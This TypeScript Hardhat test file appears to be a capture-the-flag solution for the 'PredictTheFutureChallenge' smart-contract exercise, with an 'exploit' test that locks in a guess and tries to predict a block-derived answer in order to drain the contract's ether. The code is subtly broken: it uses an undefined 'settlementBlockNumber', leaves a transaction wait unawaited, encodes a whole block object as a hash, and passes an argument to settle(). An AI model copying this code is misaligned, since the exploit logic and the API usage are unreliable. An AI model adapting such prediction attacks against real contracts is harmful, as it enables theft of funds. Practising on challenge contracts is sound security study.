import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
import { keccak256 } from 'viem';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const tx = await target.connect(attacker).lockInGuess(5, {value: utils.parseEther('1')});
    tx.wait();
    let currentBlockNumber = await provider.getBlockNumber();
      while(currentBlockNumber <= settlementBlockNumber){
        await new Promise(resolve => setTimeout(resolve,1000));
        currentBlockNumber = await provider.getBlockNumber();
      }
      const blockHash = await provider.getBlock(currentBlockNumber - 1);
      const timeStamp = Date.now();
      const currentTimestampInSeconds = Math.floor(timeStamp / 1000);
      const hash = keccak256(ethers.utils.defaultAbiCoder.encode(
        ['bytes32', 'uint256'], // Tipos dos argumentos
        [blockHash, currentTimestampInSeconds])) ; 
        const hashAsNumber = BigInt(hash);
        const answer = hashAsNumber % BigInt(10);
        const transaction = await target.connect(attacker).settle(answer , {value : utils.parseEther('1')});


    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
